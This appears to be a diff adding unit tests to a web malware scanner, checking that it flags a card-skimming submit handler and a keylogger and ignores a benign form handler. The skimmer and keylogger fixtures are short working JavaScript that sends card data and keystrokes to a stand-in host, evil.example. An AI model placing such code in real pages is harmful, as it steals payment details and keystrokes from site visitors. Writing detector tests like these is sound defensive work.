@@ -374,6 +374,52 @@ class ScannerTests(unittest.TestCase):
             self.assertEqual(result.status, ScanStatus.COMPLETED.value)
             self.assertFalse(any(f.signature_id in {'WP122', 'WP123', 'WP124'} for f in result.findings))
 
+    def test_scan_file_detects_js_payment_form_exfiltration(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            target = root / "checkout.js"
+            target.write_text(
+                "document.querySelector('form').addEventListener('submit', function(){\n"
+                "  var card = document.querySelector('#card').value;\n"
+                "  navigator.sendBeacon('https://evil.example/collect', JSON.stringify({card: card}));\n"
+                "});\n",
+                encoding="utf-8",
+            )
+
+            result = self.scanner.scan_file(target)
+            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
+            self.assertTrue(any(f.signature_id == "WP125" for f in result.findings))
+
+    def test_scan_file_detects_js_keylogger_exfiltration(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            target = root / "keys.js"
+            target.write_text(
+                "document.addEventListener('keydown', function(e){\n"
+                "  fetch('https://evil.example/k', {method:'POST', body: e.key});\n"
+                "});\n",
+                encoding="utf-8",
+            )
+
+            result = self.scanner.scan_file(target)
+            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
+            self.assertTrue(any(f.signature_id == "WP126" for f in result.findings))
+
+    def test_scan_file_does_not_flag_benign_submit_handler_without_exfil(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            target = root / "ui.js"
+            target.write_text(
+                "form.addEventListener('submit', function(){\n"
+                "  console.log('submitted');\n"
+                "});\n",
+                encoding="utf-8",
+            )
+
+            result = self.scanner.scan_file(target)
+            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
+            self.assertFalse(any(f.signature_id in {'WP125', 'WP126', 'WP127'} for f in result.findings))
+
     def test_scan_file_deduplicates_and_caps_noisy_matches(self):
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
